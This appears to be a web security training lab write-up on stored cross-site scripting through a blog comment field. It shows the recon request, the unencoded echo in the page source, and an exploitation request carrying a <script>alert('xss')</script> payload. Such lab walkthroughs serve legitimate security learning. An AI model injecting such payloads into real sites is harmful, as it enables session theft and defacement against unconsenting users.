### Stored XSS into HTML context with nothing encoded
#### **Recon:**
-----
**Request:**
```http
POST /post/comment HTTP/2
Host: 048.web-security-academy.net

...Omitted for Brevity...

csrf=OFcW3FMwg7OWE4oYCxBSzPRVOca8WbFT&postId=2&comment=<b>content_injection</b>&name=user&email=user@user.com&website=http://user.com
```
**Response:**
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2711

...Omitted for Brevity...
```
`view-source:https://048.web-security-academy.net/post?postId=2`
```html
...Omitted for Brevity...
<section class="comment">
	<p>
	<img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://user.com">user</a> | 07 October 2023
	</p>
	<p><b>conent_injection</b></p>
	<p></p>
</section>
...Omitted for Brevity...
```
Content Injection Confirmed

**Affected Location:**
```
https://048.web-security-academy.net/post?postId=2
```

### Exploitation
----
**Payload:** 
```js
<script>alert("xss")</script>
```

**Request:**
```http
POST /post/comment HTTP/2
Host: 0a9a00c3047830e081987ae900b50048.web-security-academy.net

...Omitted for Brevity...

csrf=OFcW3FMwg7OWE4oYCxBSzPRVOca8WbFT&postId=2&comment=<script>alert('xss')</script>&name=user&email=user@user.com&website=http://user.com
```
**Response:**
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 5880
```